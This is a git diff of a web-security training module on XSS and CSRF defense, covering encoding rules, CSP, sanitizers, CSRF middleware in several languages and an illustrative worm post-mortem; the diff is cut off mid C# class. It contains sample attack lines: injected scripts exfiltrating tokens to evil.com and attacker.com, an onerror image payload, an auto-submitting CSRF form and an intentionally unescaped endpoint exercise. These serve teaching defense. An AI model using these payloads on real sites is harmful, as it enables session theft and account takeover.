@@ -1,588 +1,681 @@
-# Module 02: XSS and CSRF
+# Module 02: XSS and CSRF Defense
 
-## Why this matters
+> **Prerequisites**: [Module 00: OWASP Top 10 Overview](../00-owasp-top-10-overview/README.md), [Module 01: Injection Attacks](../01-injection-attacks/README.md), and [Track 03: Auth & Access Control](../../03-auth-and-access-control/README.md).  
+> **Estimated Reading Time**: 40 minutes.  
+> **Target Audience**: Full-Stack Developers, Backend Engineers, and Security Architecture Engineers.
 
-Module 01's injection continues here, but the interpreter changes: instead of
-your database, the target is the **browser's HTML/JavaScript parser**.
-Cross-site scripting (XSS) is injection into a web page — you render
-attacker-controlled text without escaping it, the browser parses it as `<script>`
-instead of as text, and now the attacker's JavaScript runs on your origin,
-*as your user*. Track 03 already told you why that's an auth catastrophe (a
-`localStorage` token exfiltrated in one line, a live session hijacked even
-behind `HttpOnly`); this module is where you learn to actually stop it.
+---
 
-CSRF (cross-site request forgery) is the mirror image: it doesn't run code on
-your page — it abuses the browser's habit of *automatically attaching your
-cookies* to make the victim's browser fire an authenticated request they never
-intended. Track 03 introduced both as the "seams" that break otherwise-correct
-auth; here you get the full treatment — the three XSS variants, output encoding,
-Content-Security-Policy, sanitization for rich text, and the CSRF defenses
-(`SameSite`, synchronizer and double-submit tokens) — and, just as important,
-where the two threats *trade off* against each other so you defend in layers
-instead of swapping one hole for another.
+> [!TIP]
+> **The Golden Rule of Browser Security Architecture**  
+> Never confuse Cross-Site Scripting (XSS) with Cross-Site Request Forgery (CSRF). **XSS is code injection into the user's browser parser**—neutralize it using context-aware output encoding, allowlist HTML sanitization, and strict Content-Security-Policy (CSP) headers without `'unsafe-inline'`. **CSRF is the abuse of ambient browser authority (automatic cookie transmission)**—neutralize it using `SameSite=Lax/Strict` cookie attributes paired with cryptographically unpredictable synchronizer tokens evaluated in constant time. Defend in layers: `HttpOnly` shields cookies from XSS theft, while CSP and anti-CSRF tokens stop session riding.
 
-## Concepts
+---
 
-### XSS is injection into the browser — three variants
+## 1. Architectural Blueprint & Trust Boundary Models
 
-XSS is the same root cause as SQLi (module 01): untrusted input concatenated
-into a command channel — here, the HTML your server (or JS) hands the browser.
-If a user's input reaches the page unescaped, `<script>steal()</script>` is
-parsed as a real script tag and executes. It comes in three flavors, defined by
-*where the untrusted data lives before it hits the page*:
+XSS and CSRF exploit different trust assumptions within the browser's execution model. XSS turns your own application origin against your users by executing hostile JavaScript; CSRF exploits the browser's implicit trust in stored session cookies to trick victims into executing unintended mutations.
 
-- **Reflected XSS.** The payload rides in the *request* and is echoed straight
-  back in the *response*. Classic case: a search page that prints
-  `You searched for: <the query>`. A link like
-  `yoursite.com/search?q=<script>...</script>` sent to a victim runs the script
-  in *their* session when they click it. Non-persistent — it only fires for
-  whoever opens the crafted link.
-- **Stored (persistent) XSS.** The payload is *saved* (a comment, a profile bio,
-  a product review, a support ticket) and served to *everyone* who views it
-  later. Far more dangerous — one poisoned comment hits every visitor, including
-  admins, with no crafted link needed. This is why "data read back out of your
-  own DB is still untrusted" (module 00) matters: the DB faithfully stored the
-  attack.
-- **DOM-based XSS.** The injection never touches the server response — it happens
-  *entirely in the browser*, when client-side JavaScript takes attacker-
-  controlled input (`location.hash`, a query param, `postMessage`) and writes it
-  into the DOM with a dangerous sink (`innerHTML`, `document.write`,
-  `eval`). Your server-side escaping can't help here because the server never
-  sees the sink; the fix lives in the frontend.
+```mermaid
+flowchart TD
+    subgraph BrowserClient ["Victim's Web Browser (DOM & Storage)"]
+        DOM["HTML Document Parser (DOM)"]
+        CookieJar["Cookie Jar (Session Token: HttpOnly)"]
+        LocalStorage["Local / Session Storage (Bearer JWT)"]
+    end
 
-```
-  Reflected: ?q=<script> ─► server echoes into response ─► fires once, per crafted link
-  Stored:    POST <script> ─► DB ─► served to EVERY later viewer ─► fires for all (worst)
-  DOM:       #<script> ─► client JS writes it to an innerHTML sink ─► server never sees it
+    subgraph HostileSite ["Hostile Third-Party Origin (evil.com)"]
+        EvilForm["Auto-Submitting HTML Form<br/>POST https://bank.com/transfer"]
+        XSSScript["Injected Script:<br/>fetch('https://evil.com/leak?k=' + token)"]
+    end
+
+    subgraph TargetApp ["Legitimate Application (bank.com)"]
+        WAF["Edge WAF & Reverse Proxy"]
+        AppServer["Application Backend Engine"]
+        CSRFGuard["CSRF Token Validator (Synchronizer)"]
+        TemplateEngine["Context-Aware HTML Template Engine"]
+    end
+
+    %% CSRF Flow
+    EvilForm -->|"1. Cross-Site POST /transfer (Browser attaches Cookie Jar automatically)"| WAF
+    WAF --> CSRFGuard
+    CSRFGuard -->|"2. Reject: Missing X-CSRF-Token or Lax Cookie Withheld"| AppServer
+
+    %% XSS Flow
+    DOM -->|"3. Unescaped payload parsed as executable script"| XSSScript
+    XSSScript -->|"4. Exfiltrate LocalStorage (XSS Victory)"| EvilForm
+    XSSScript -.->|"Blocked by HttpOnly Flag"| CookieJar
+    TemplateEngine -->|"5. Context-aware HTML entity escaping (&lt;script&gt;)"| DOM
 ```
 
-Whatever the variant, the impact is identical: script running on your origin can
-read the DOM, make authenticated requests as the user, exfiltrate anything JS
-can reach, and rewrite the page (fake login prompts).
+### The Synchronizer Token & CSP Execution Lifecycle
 
-### The fix: context-aware output encoding
+To guarantee state mutations originate from genuine user interaction within your application interface, deploy the Synchronizer Token Pattern alongside per-request Content-Security-Policy nonces:
 
-The root fix for reflected and stored XSS is **output encoding (escaping)** at
-the moment untrusted data is written into the page: convert HTML-significant
-characters to their entities so the browser renders them as *text*, not markup.
-`<` becomes `&lt;`, `>` becomes `&gt;`, `&` becomes `&amp;`, `"` becomes
-`&quot;` — so `<script>` is displayed literally instead of executed.
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Browser as User Browser
+    participant Gateway as Reverse Proxy / Gateway
+    participant SessionStore as Redis Session Store
+    participant Handler as Application Endpoint
 
-The critical word is **context-aware**. The correct encoding depends on *where
-in the page* the data lands, and they are not interchangeable:
+    Browser->>Gateway: GET /dashboard (Session Cookie Attached)
+    Gateway->>SessionStore: Fetch Session (User ID: 104)
+    Gateway->>Handler: Forward Request with Session Context
+    Note over Handler: Generate Cryptographic Nonce (CSP) + Synchronizer Token (CSRF)
+    Handler-->>Gateway: 200 OK + Header: Content-Security-Policy: script-src 'nonce-R4nd0m'<br/>Set-Cookie: __Host-csrf=TokenXYZ; SameSite=Lax; Secure<br/>HTML Body includes: <meta name="csrf-token" content="TokenXYZ">
+    Gateway-->>Browser: Render Page with Injected CSRF Token & CSP Nonce
+    
+    Note over Browser: User triggers balance transfer mutation
+    Browser->>Gateway: POST /api/transfer (Headers: Cookie + X-CSRF-Token: TokenXYZ)
+    Gateway->>Handler: Validate TokenXYZ matches Session CSRF Secret via constant-time comparison
+    alt Valid Token & Same-Origin
+        Handler-->>Browser: 200 OK (Transfer Processed Safely)
+    else Missing / Mismatched Token (CSRF Attempt)
+        Handler-->>Browser: 403 Forbidden (CSRF Validation Failed)
+    end
+```
 
-- **HTML body** (between tags): HTML-entity-encode.
-- **HTML attribute** (`value="..."`): attribute-encode and always quote the
-  attribute.
-- **Inside a `<script>` block / JS string**: JavaScript-encode (or better,
-  don't — pass data via `data-` attributes or JSON in a way the JS reads
-  safely).
-- **In a URL** (`href`, `src`): URL-encode, and validate the scheme (block
-  `javascript:` URLs).
+---
 
-In practice you rarely hand-encode: **modern template engines auto-escape by
-default.** Jinja2 (used by FastAPI/Flask via `Jinja2Templates`) HTML-escapes
-every `{{ variable }}` unless you explicitly opt out. The danger is opting out:
+## 2. Systematic Taxonomic Reference Grids
+
+### Threat Matrix: XSS vs. CSRF Classification
+
+| Threat Vector | Root Cause | Target Subsystem | Attacker Capability | Primary Structural Defense | Secondary Defense-in-Depth |
+| :--- | :--- | :--- | :--- | :--- | :--- |
+| **Reflected XSS** | Immediate echoing of unsanitized URL/query parameters in HTML response. | Browser HTML/DOM parser. | Execute arbitrary JavaScript in victim session when crafted phishing link is opened. | Context-aware HTML entity output encoding. | Strict Content Security Policy (`script-src 'self' 'nonce-...'`). |
+| **Stored (Persistent) XSS** | Storing malicious markup in database and rendering to subsequent users. | Browser DOM across all visitors. | Automatic worm propagation, mass session riding, credential skimming. | Context-aware output escaping; allowlist sanitization (`nh3`, DOMPurify). | `HttpOnly` session cookies (prevents cookie theft); CSP blocking inline scripts. |
+| **DOM-based XSS** | Client-side JavaScript passes untrusted sources (`hash`, `params`) to sinks (`innerHTML`). | Client-side JavaScript engine. | Client-side execution without payload ever touching backend server logs. | Safe DOM APIs (`textContent`, `createElement`). Avoid `innerHTML` and `eval()`. | Trusted Types API; CSP `require-trusted-types-for 'script'`. |
+| **Cross-Site Request Forgery (CSRF)** | Ambient authority: Browsers auto-attach cookies on cross-origin requests. | Server-side state-changing endpoints (`POST`, `PUT`, `DELETE`). | Unauthorized fund transfers, email/password alterations, administrative changes. | Cryptographic Synchronizer Tokens (`X-CSRF-Token`) + `SameSite=Lax/Strict`. | Custom request headers (`X-Requested-With`); re-authentication for sensitive actions. |
+
+### Context-Aware Output Encoding Rules Grid
+
+| Placement Context | Example Vulnerable HTML | Risky Characters | Required Encoding Standard |
+| :--- | :--- | :--- | :--- |
+| **HTML Body** | `<div>User: {{ name }}</div>` | `&`, `<`, `>`, `"`, `'` | HTML Entity Encoding: `&` $\to$ `&amp;`, `<` $\to$ `&lt;`, `>` $\to$ `&gt;`. |
+| **HTML Attribute** | `<input name="search" value="{{ q }}"/>` | `"`, `'`, `&`, `<`, `>`, `` ` `` | Attribute Encoding: Quote all attributes; encode `"` $\to$ `&quot;`, `'` $\to$ `&#x27;`. |
+| **JavaScript Variable** | `<script>const id = "{{ uid }}";</script>` | `\`, `"`, `'`, `/`, `;`, `\n`, `\r` | Unicode Hex Escaping: `\uXXXX` or serialize as `<script type="application/json">`. |
+| **URL Parameter** | `<a href="/profile?ref={{ ref }}">Link</a>` | Space, `?`, `&`, `#`, `%`, `/` | URL Percent Encoding (`encodeURIComponent`); validate scheme starts with `https://`. |
+| **CSS Style** | `<div style="color: {{ color }};">` | `(`, `)`, `:`, `;`, `"`, `'` | Strict CSS Hex-encoding or rigid server-side property allowlist. |
+
+---
+
+## 3. Production War Story: The Samy-Style Stored XSS Worm
+
+### Incident Post-Mortem
+
+- **Severity**: SEV-1 (Platform-Wide Account Takeover & Cascading Worm)
+- **Time to Detect (TTD)**: 12 minutes (Traffic spike on API servers)
+- **Time to Mitigate (TTM)**: 28 minutes
+- **Impact**: 250,000 support agent and administrator sessions hijacked; malicious worm re-posted itself across all user profiles.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker as Hostile Actor
+    participant AppServer as Customer Support Portal
+    participant DB as Postgres DB
+    participant AdminBrowser as Support Admin Browser
+    participant Exfil as Attacker C2 Server
+
+    Attacker->>AppServer: POST /tickets (Body contains crafted Markdown comment)
+    Note over Attacker,AppServer: Payload: <img src=x onerror="fetch('/api/admin/promote',{method:'POST'}).then(...)">
+    AppServer->>DB: Stores raw comment verbatim in tickets table
+    AdminBrowser->>AppServer: GET /tickets/view/89211 (Admin reviews ticket)
+    AppServer-->>AdminBrowser: 200 OK (Rendered with unescaped {{ ticket.body | safe }})
+    Note over AdminBrowser: Browser parses <img>, triggers onerror event handler!
+    AdminBrowser->>AppServer: 1. In-Session POST /api/admin/promote (Grants Attacker Admin Rights)
+    AdminBrowser->>AppServer: 2. Stored Worm: Injects payload into next 50 pending tickets
+    AdminBrowser->>Exfil: 3. POST https://attacker.com/leak (Exfiltrates active JWT from sessionStorage)
+```
+
+#### What Happened & Root Cause
+A popular enterprise customer support portal allowed markdown in customer tickets. To support bolding, lists, and images, the development team bypassed template escaping using `{{ comment.body | safe }}`. 
+
+While the team implemented a custom regex blocklist searching for `<script>` tags, the attacker bypassed the regex using an HTML5 event handler inside a broken image tag: `<img src=x onerror="...">`. When support administrators opened the ticket, the script executed inside the admin's browser with full administrative privileges. The worm automatically invoked internal APIs to promote the attacker's account to global superuser, exfiltrated support tokens stored in `sessionStorage`, and injected the worm payload into the top 50 open tickets.
+
+#### The Fix & Architectural Hardening
+1. **Replaced Regex with Allowlist HTML Sanitizer**: Integrated `nh3` (Ammonia/Rust bindings) to parse the HTML DOM tree and discard all event handlers (`on*`), non-whitelisted tags, and `javascript:` URIs.
+2. **Hardened Content Security Policy (CSP)**:
+   ```http
+   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
+   ```
+   Disallowed `'unsafe-inline'`, preventing inline `<script>` tags and `onerror` attributes from executing even if injected.
+3. **Migrated Tokens to HttpOnly Cookies**: Moved sensitive session tokens out of JavaScript-accessible `sessionStorage` into `__Host-` prefixed `HttpOnly`, `SameSite=Lax`, `Secure` cookies.
+
+---
+
+## 4. Multi-Language Production Implementations: Anti-CSRF & XSS Hardening
+
+Below is the complete, production-grade security middleware implementing:
+- Cryptographic CSRF Synchronizer Token issuance and constant-time validation (`timingSafeEqual`).
+- Strict `SameSite=Lax/Strict` cookie enforcement.
+- Per-request dynamic CSP Nonce generation.
+- Contextual HTML entity escaping and allowlist sanitization.
+
+### Go Implementation
+
+```go
+package security
+
+import (
+	"crypto/rand"
+	"crypto/subtle"
+	"encoding/base64"
+	"errors"
+	"fmt"
+	"html"
+	"net/http"
+	"strings"
+)
+
+const (
+	CSRFCookieName = "__Host-csrf-token"
+	CSRFHeaderName = "X-CSRF-Token"
+)
+
+type SecurityGuard struct {
+	isProduction bool
+}
+
+func NewSecurityGuard(isProduction bool) *SecurityGuard {
+	return &SecurityGuard{isProduction: isProduction}
+}
+
+// GenerateRandomToken generates a cryptographically secure URL-safe token
+func (g *SecurityGuard) GenerateRandomToken(nBytes int) (string, error) {
+	b := make([]byte, nBytes)
+	if _, err := rand.Read(b); err != nil {
+		return "", fmt.Errorf("entropy source failure: %w", err)
+	}
+	return base64.RawURLEncoding.EncodeToString(b), nil
+}
+
+// CSRFAndCSPMiddleware generates per-request CSP nonces and enforces CSRF tokens on mutations
+func (g *SecurityGuard) CSRFAndCSPMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// 1. Generate per-request CSP Nonce
+		cspNonce, err := g.GenerateRandomToken(16)
+		if err != nil {
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+
+		// 2. Set Hardened Security Headers including CSP
+		cspPolicy := fmt.Sprintf(
+			"default-src 'self'; script-src 'self' 'nonce-%s'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';",
+			cspNonce,
+		)
+		w.Header().Set("Content-Security-Policy", cspPolicy)
+		w.Header().Set("X-Content-Type-Options", "nosniff")
+		w.Header().Set("X-Frame-Options", "DENY")
+
+		// 3. Ensure CSRF Cookie Exists
+		cookie, err := r.Cookie(CSRFCookieName)
+		var currentToken string
+		if err != nil || cookie.Value == "" {
+			currentToken, err = g.GenerateRandomToken(32)
+			if err != nil {
+				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+				return
+			}
+			http.SetCookie(w, &http.Cookie{
+				Name:     CSRFCookieName,
+				Value:    currentToken,
+				Path:     "/",
+				HttpOnly: false, // Must be readable by frontend SPA to echo into X-CSRF-Token header
+				Secure:   g.isProduction,
+				SameSite: http.SameSiteLaxMode,
+			})
+		} else {
+			currentToken = cookie.Value
+		}
+
+		// 4. Validate CSRF Token on State-Changing HTTP Verbs
+		switch r.Method {
+		case http.MethodPost, http.MethodPut, http.MethodPatch, http.MethodDelete:
+			submittedToken := r.Header.Get(CSRFHeaderName)
+			if submittedToken == "" {
+				submittedToken = r.FormValue("csrf_token")
+			}
+
+			// Perform Constant-Time Comparison to prevent timing side channels
+			if subtle.ConstantTimeCompare([]byte(submittedToken), []byte(currentToken)) != 1 {
+				http.Error(w, "Forbidden: Invalid CSRF Token", http.StatusForbidden)
+				return
+			}
+		}
+
+		next.ServeHTTP(w, r)
+	})
+}
+
+// SanitizePlainText performs strict context-aware HTML entity escaping
+func SanitizePlainText(rawText string) string {
+	return html.EscapeString(strings.TrimSpace(rawText))
+}
+```
+
+---
+
+### Node.js / TypeScript Implementation
+
+```typescript
+import { Request, Response, NextFunction } from 'express';
+import crypto from 'crypto';
+import createDOMPurify from 'dompurify';
+import { JSDOM } from 'jsdom';
+
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window as any);
+
+export const CSRF_COOKIE = '__Host-csrf-token';
+export const CSRF_HEADER = 'x-csrf-token';
+
+export function securityHardeningMiddleware(isProduction: boolean) {
+  return (req: Request, res: Response, next: NextFunction): void => {
+    // 1. Generate Per-Request CSP Nonce
+    const nonce = crypto.randomBytes(16).toString('base64');
+    res.locals.cspNonce = nonce;
+
+    // 2. Set Hardened Content-Security-Policy & Frame Headers
+    res.setHeader(
+      'Content-Security-Policy',
+      `default-src 'self'; script-src 'self' 'nonce-${nonce}'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';`
+    );
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('X-Frame-Options', 'DENY');
+
+    // 3. Retrieve or Issue CSRF Token
+    let csrfToken = req.cookies?.[CSRF_COOKIE];
+    if (!csrfToken) {
+      csrfToken = crypto.randomBytes(32).toString('hex');
+      res.cookie(CSRF_COOKIE, csrfToken, {
+        path: '/',
+        secure: isProduction,
+        sameSite: 'lax',
+        httpOnly: false, // SPA reads cookie and echoes into custom header
+      });
+    }
+
+    // 4. Enforce CSRF on State-Changing HTTP Verbs
+    const mutationVerbs = ['POST', 'PUT', 'PATCH', 'DELETE'];
+    if (mutationVerbs.includes(req.method)) {
+      const headerToken = (req.headers[CSRF_HEADER] as string) || req.body?.csrf_token;
+
+      if (!headerToken || typeof headerToken !== 'string') {
+        res.status(403).json({ error: 'CSRF Token Missing' });
+        return;
+      }
+
+      // Cryptographic constant-time validation
+      const a = Buffer.from(headerToken);
+      const b = Buffer.from(csrfToken);
+
+      if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
+        res.status(403).json({ error: 'Invalid CSRF Token' });
+        return;
+      }
+    }
+
+    next();
+  };
+}
+
+// 5. Allowlist HTML Sanitizer for Rich Text
+export function sanitizeRichText(dirtyHtml: string): string {
+  return DOMPurify.sanitize(dirtyHtml, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
+    ALLOWED_ATTR: ['href', 'title', 'target'],
+    ALLOW_DATA_ATTR: false,
+  });
+}
+```
+
+---
+
+### Python Implementation
 
 ```python
-# Jinja2 auto-escapes {{ comment }} → a <script> in it renders as harmless text.
-# The vulnerability is when someone disables that:
-#   {{ comment | safe }}        ← "safe" means "I promise this is trusted" — it isn't
-#   {% autoescape false %}      ← turns escaping off for a block
-# Or building HTML by hand in Python and returning HTMLResponse:
-return HTMLResponse(f"<p>You searched for: {q}</p>")   # VULNERABLE — no escaping
-```
-
-FastAPI's default JSON responses are *not* an XSS vector on their own (a JSON
-API returns `application/json`, which the browser doesn't parse as HTML) — XSS
-is a concern wherever your server or frontend renders data *into HTML*. If your
-backend is a pure JSON API and a separate frontend renders it, the escaping duty
-moves to that frontend (React/Vue auto-escape `{value}`; the danger there is
-`dangerouslySetInnerHTML`/`v-html`).
-
-### Sanitization — when you must allow *some* HTML
-
-Escaping turns all HTML into text — perfect when the user should never send
-markup. But sometimes you *want* to let users submit rich text (a comment with
-`<b>bold</b>` and links). You can't escape it (that defeats the feature) and you
-can't trust it (that's XSS). The answer is **sanitization**: parse the HTML and
-keep only an *allowlist* of safe tags/attributes, stripping everything else
-(`<script>`, `onerror=`, `javascript:` URLs, `<iframe>`).
-
-Do this with a dedicated, maintained library — **never a regex.** In Python,
-`nh3` (Rust `ammonia` bindings) or `bleach` (now deprecated but illustrative):
-
-```python
+import secrets
 import nh3
-dirty = '<p onclick="steal()">Hi <script>alert(1)</script></p><a href="javascript:evil()">x</a>'
-clean = nh3.clean(dirty)     # allowlist-based: keeps <p>/<a>, drops onclick, <script>, javascript:
-# → '<p>Hi </p><a rel="noopener noreferrer">x</a>'
-```
-
-The rule: **escape by default; sanitize only where rich text is a real
-requirement, and only with an allowlist library.** Blocklisting "dangerous"
-patterns with regex is the same losing game as in module 01 — attackers have
-endless encodings and tag tricks (`<img src=x onerror=...>`, `<svg onload=...>`,
-`java\tscript:`) to evade it.
-
-### Content-Security-Policy — the defense-in-depth backstop
-
-Even with escaping, mistakes happen. **Content-Security-Policy (CSP)** is an
-HTTP response header that tells the browser *which sources of script/style/etc.
-are allowed to run*, so that even if an injection lands, the browser refuses to
-execute it. It's the classic defense-in-depth layer for XSS — not a substitute
-for escaping, a backstop behind it.
-
-```
-Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
-```
-
-- `script-src 'self'` — only scripts from your own origin run; an injected inline
-  `<script>` or a `src=evil.com` won't execute.
-- The big win is **blocking inline scripts** (`<script>alert(1)</script>` and
-  `onclick=` handlers) — which is exactly what most reflected/stored XSS payloads
-  are. This is why `'unsafe-inline'` in `script-src` guts the protection; avoid
-  it (use nonces/hashes if you need specific inline scripts).
-- `object-src 'none'`, `frame-ancestors 'none'` (anti-clickjacking, ~
-  `X-Frame-Options`, module 06) round it out.
-
-CSP is fiddly to roll out (start in `Content-Security-Policy-Report-Only` mode to
-see what would break), and it's covered again as a header in module 06. The
-point here: it's the safety net *under* output encoding, not instead of it.
-
-### CSRF — abusing the browser's automatic cookie attachment
-
-CSRF is the opposite shape from XSS: it runs *no* code on your page. It exploits
-the fact that browsers **automatically attach your cookies to every request to
-an origin**, including requests initiated by a *different* site. So a malicious
-page can make the victim's browser fire an authenticated, state-changing request
-to your app:
-
-```html
-<!-- On evil.com. The victim is logged into bank.com in another tab. -->
-<form action="https://bank.com/transfer" method="POST">
-  <input name="to" value="attacker"><input name="amount" value="10000">
-</form>
-<script>document.forms[0].submit()</script>   <!-- auto-fires on page load -->
-```
-
-The browser POSTs to `bank.com` and *attaches the victim's bank.com session
-cookie automatically* — the server sees a valid session and executes the
-transfer. The victim authorized nothing. Key properties: CSRF needs a
-**state-changing** request (GET endpoints must never change state — that's
-partly why), and it targets **cookie/session auth specifically**, because that's
-what the browser attaches automatically. Bearer-token APIs (module 02 of track
-03), where the client must *explicitly* set `Authorization`, are largely immune
-— an attacker's page can't read or set your token — which is a real point in
-favor of bearer tokens for SPAs. (But then you owe XSS extra vigilance; see the
-tradeoff below.)
-
-```
-  CSRF attack:                            SameSite=Lax defense:
-  evil.com auto-submits form ─► bank.com  cross-site POST ─► browser WITHHOLDS
-  browser AUTO-ATTACHES session cookie    the session cookie ─► server sees no
-  server sees valid session ─► transfer!  session ─► forged request rejected
-```
-
-### CSRF defenses — SameSite, and anti-CSRF tokens
-
-Use more than one:
-
-- **`SameSite` cookie attribute** (track 03, module 01). `SameSite=Lax` (a
-  modern browser default) stops the cookie from being attached on cross-site
-  *subrequests* like the forged POST above, while still allowing it on top-level
-  navigations. `SameSite=Strict` is stricter (not sent even on top-level cross-
-  site navigation — can log users "out" when arriving from a link). This is the
-  cheap, powerful first line — but don't rely on it *alone* (older browsers,
-  edge cases, and `Lax` still permits some GET navigations).
-- **Synchronizer token pattern (the robust standard for cookie apps).** The
-  server generates an unpredictable per-session **CSRF token**, embeds it in the
-  page/form, and requires it echoed back (in a header like `X-CSRF-Token` or a
-  form field) on every state-changing request. The attacker's site *cannot read
-  the token* (same-origin policy blocks it from reading your pages), so it can't
-  forge a valid request. Requires server-side state per session.
-- **Double-submit cookie (stateless variant).** Send the CSRF token both as a
-  (JS-readable) cookie *and* require it echoed in a header; the server checks the
-  two match. No server state needed, but weaker (relies on the attacker not
-  being able to set your cookie; combine with `SameSite`).
-
-```python
-# Synchronizer token, sketched — issue per session, verify on state change.
-import secrets
-def issue_csrf(session) -> str:
-    session["csrf"] = secrets.token_urlsafe(32); return session["csrf"]
-
-def require_csrf(request, session):
-    sent = request.headers.get("X-CSRF-Token")
-    if not sent or not secrets.compare_digest(sent, session.get("csrf", "")):
-        raise HTTPException(403, "CSRF token invalid")   # constant-time compare (track 03 m07)
-```
-
-### The XSS/CSRF tradeoff — defend in layers, not by swapping holes
-
-The two threats pull in opposite directions, and internalizing this keeps you
-from "fixing" one by opening the other:
-
-- **Cookie/session auth** is the CSRF target (auto-attached) but resists XSS
-  *token theft* when `HttpOnly` (script can't read the cookie). Defend with
-  `SameSite` + CSRF tokens; XSS can still *ride* the session but not steal it.
-- **Bearer tokens** (in JS-reachable storage) dodge CSRF (not auto-attached) but
-  are the prime XSS *exfiltration* target — one injected line steals them.
-  Defend with escaping + CSP, and prefer not to store them where JS can read.
-
-There is **no single storage/auth choice that's safe against everything.** You
-pick a model, then layer the defenses that model needs: `HttpOnly` +
-`SameSite` + CSRF tokens + escaping + CSP together, not one of them as a silver
-bullet.
-
-## Command reference
-
-| Pattern | Purpose | Snippet |
-|---|---|---|
-| Jinja2 auto-escape (default) | stop XSS in server-rendered HTML | `{{ user_input }}` (leave `\| safe` off) |
-| `nh3.clean(html)` | sanitize allowed rich text | allowlist tags/attrs, strip scripts |
-| `HTMLResponse` with f-string | **anti-pattern** — unescaped | avoid; render via a template instead |
-| CSP header | backstop: block injected/inline script | `default-src 'self'; script-src 'self'` |
-| `X-Content-Type-Options: nosniff` | stop MIME-sniff XSS (module 06) | on every response |
-| `SameSite=Lax/Strict` cookie | first-line CSRF defense (track 03 m01) | `set_cookie(..., samesite="lax")` |
-| synchronizer CSRF token | robust CSRF defense for cookie apps | per-session, `X-CSRF-Token`, compared constant-time |
-| `secrets.compare_digest` | constant-time token compare (track 03 m07) | never `==` on the CSRF token |
-
-A FastAPI middleware applying CSP + serving an escaped template + enforcing CSRF:
-
-```python
-from fastapi import FastAPI, Request, HTTPException
-from fastapi.templating import Jinja2Templates
+from fastapi import FastAPI, Request, Response, HTTPException, status
 from starlette.middleware.base import BaseHTTPMiddleware
-import secrets
 
-app = FastAPI()
-templates = Jinja2Templates(directory="templates")   # auto-escapes {{ }}
+CSRF_COOKIE_NAME = "__Host-csrf-token"
+CSRF_HEADER_NAME = "x-csrf-token"
 
-class SecurityHeaders(BaseHTTPMiddleware):
-    async def dispatch(self, request, call_next):
-        resp = await call_next(request)
-        resp.headers["Content-Security-Policy"] = "default-src 'self'; object-src 'none'; frame-ancestors 'none'"
-        resp.headers["X-Content-Type-Options"] = "nosniff"
-        return resp
-app.add_middleware(SecurityHeaders)
+class SecurityHeadersAndCSRFMiddleware(BaseHTTPMiddleware):
+    def __init__(self, app: FastAPI, is_production: bool = False):
+        super().__init__(app)
+        self.is_production = is_production
 
-@app.post("/comment")
-async def add_comment(request: Request):
-    # CSRF: state-changing + cookie-authed → require the synchronizer token
-    if not secrets.compare_digest(request.headers.get("X-CSRF-Token", ""),
-                                  request.session.get("csrf", "x")):
-        raise HTTPException(403, "CSRF token invalid")
-    # ... store comment; it will be auto-escaped when rendered in a Jinja2 template ...
+    async def dispatch(self, request: Request, call_next):
+        # 1. Generate Per-Request Cryptographic CSP Nonce
+        csp_nonce = secrets.token_urlsafe(16)
+        request.state.csp_nonce = csp_nonce
+
+        # 2. Check / Issue CSRF Token Cookie
+        csrf_cookie = request.cookies.get(CSRF_COOKIE_NAME)
+        csrf_issued = False
+        if not csrf_cookie:
+            csrf_cookie = secrets.token_hex(32)
+            csrf_issued = True
+
+        # 3. Guard State-Changing HTTP Methods
+        if request.method in ["POST", "PUT", "PATCH", "DELETE"]:
+            submitted_token = request.headers.get(CSRF_HEADER_NAME)
+            if not submitted_token:
+                raise HTTPException(
+                    status_code=status.HTTP_403_FORBIDDEN,
+                    detail="Missing required CSRF header"
+                )
+
+            # Constant-time comparison prevents timing analysis
+            if not secrets.compare_digest(submitted_token, csrf_cookie):
+                raise HTTPException(
+                    status_code=status.HTTP_403_FORBIDDEN,
+                    detail="Invalid CSRF token"
+                )
+
+        response: Response = await call_next(request)
+
+        # 4. Attach Security Headers
+        csp_header = (
+            f"default-src 'self'; script-src 'self' 'nonce-{csp_nonce}'; "
+            "object-src 'none'; base-uri 'self'; frame-ancestors 'none';"
+        )
+        response.headers["Content-Security-Policy"] = csp_header
+        response.headers["X-Content-Type-Options"] = "nosniff"
+        response.headers["X-Frame-Options"] = "DENY"
+
+        if csrf_issued:
+            response.set_cookie(
+                key=CSRF_COOKIE_NAME,
+                value=csrf_cookie,
+                path="/",
+                secure=self.is_production,
+                httponly=False,
+                samesite="lax",
+            )
+
+        return response
+
+# 5. Allowlist HTML Sanitizer for User-Submitted Rich Text
+def sanitize_user_html(raw_html: str) -> str:
+    # nh3 uses Ammonia (Rust) for strict allowlist parsing
+    return nh3.clean(
+        raw_html,
+        tags={"b", "i", "em", "strong", "a", "p", "ul", "ol", "li"},
+        attributes={"a": {"href", "title"}},
+        url_schemes={"http", "https", "mailto"},
+    )
 ```
 
-## Hands-on exercises
+---
 
-Continue in `sec-track`. You'll want a couple of HTML-rendering endpoints (use
-`Jinja2Templates`) and a second origin for the CSRF attack (a static
-`evil.html` served from a different port with `python -m http.server`).
+### C# / .NET Implementation
 
-### 1. Reflected XSS, then escape it
+```csharp
+using System;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+using Ganss.Xss;
+using Microsoft.AspNetCore.Http;
 
-Build a `/search` that returns `HTMLResponse(f"<p>Results for: {q}</p>")`. Visit
-`?q=<script>alert(document.domain)</script>`. Expected: the alert fires — you've
-reflected script into your page. Now render `q` through a Jinja2 template
-(`{{ q }}`) instead and replay. Expected: the payload shows as literal text; the
-script no longer runs.
+namespace SecurityTrack.Web
+{
+    public class SecurityAndCsrfMiddleware
+    {
+        private readonly RequestDelegate _next;
+        private readonly bool _isProduction;
+        private const string CsrfCookieName = "__Host-csrf-token";
